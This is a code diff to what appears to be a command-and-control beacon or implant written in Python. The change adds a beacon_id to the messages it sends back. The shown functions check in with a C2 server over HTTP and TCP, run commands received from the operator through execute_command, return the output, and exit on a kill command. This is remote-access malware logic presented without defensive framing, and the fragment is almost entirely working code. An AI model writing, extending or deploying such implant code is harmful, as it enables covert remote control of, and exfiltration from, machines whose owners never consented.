@@ -604,7 +604,7 @@ def http_register():
 
 
 def http_send_result(task_id, output):
-    http_post(C2_URL + "/checkin", {"task_id": task_id, "output": output})
+    http_post(C2_URL + "/checkin", {"task_id": task_id, "output": output, "beacon_id": BEACON_ID})
 
 
 def http_checkin():
@@ -723,12 +723,12 @@ def run_tcp():
                         cmd = task.get("command", "")
                         task_id = task.get("id", "")
                         if cmd == "__EXIT__":
-                            tcp_write_msg(sock, {"type": "result", "data": {"task_id": task_id, "output": "BEACON_TERMINATED"}})
+                            tcp_write_msg(sock, {"type": "result", "data": {"task_id": task_id, "output": "BEACON_TERMINATED", "beacon_id": BEACON_ID}})
                             tcp_read_msg(sock)
                             sock.close()
                             os._exit(0)
                         output = execute_command(cmd)
-                        tcp_write_msg(sock, {"type": "result", "data": {"task_id": task_id, "output": output}})
+                        tcp_write_msg(sock, {"type": "result", "data": {"task_id": task_id, "output": output, "beacon_id": BEACON_ID}})
                         tcp_read_msg(sock)  # ack
 
                 elif msg_type == "sleep":
